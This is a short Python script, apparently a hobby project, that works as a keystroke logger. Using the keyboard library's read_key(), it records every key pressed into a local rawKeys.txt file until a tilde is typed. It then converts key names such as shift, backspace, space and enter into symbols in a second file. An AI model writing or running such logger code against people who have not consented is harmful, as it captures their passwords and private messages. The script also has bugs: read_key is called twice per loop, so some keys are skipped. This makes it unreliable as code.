from keyboard import *
import string

chars = []
readdoc = open("C:/Users/schec/Documents/PythonProjects/RandProjs/KeyLogger/Documents/rawKeys.txt","r+")
writedoc = open("C:/Users/schec/Documents/PythonProjects/RandProjs/KeyLogger/Documents/mutatedKeys.txt","r+")
line = " "

for i in range(len(string.printable)):
    chars.append(string.printable[i])
def fix():
    global line
    readdoc = open("C:/Users/schec/Documents/PythonProjects/RandProjs/KeyLogger/Documents/rawKeys.txt","r+")
    line = readdoc.read()
    for i in range(len(line)):
        line = line.replace("rightshift" , "^")
        line = line.replace("shift" , "^")
        line = line.replace("backspace" , "X")
        line = line.replace("space" , " ")
        line = line.replace("enter","\n")
    writedoc.write(line)
def listen():
    while True:
        readdoc.write(read_key())
        if read_key() == "~":
            break
    readdoc.close()
    fix()

listen()
readdoc.close()
writedoc.close()
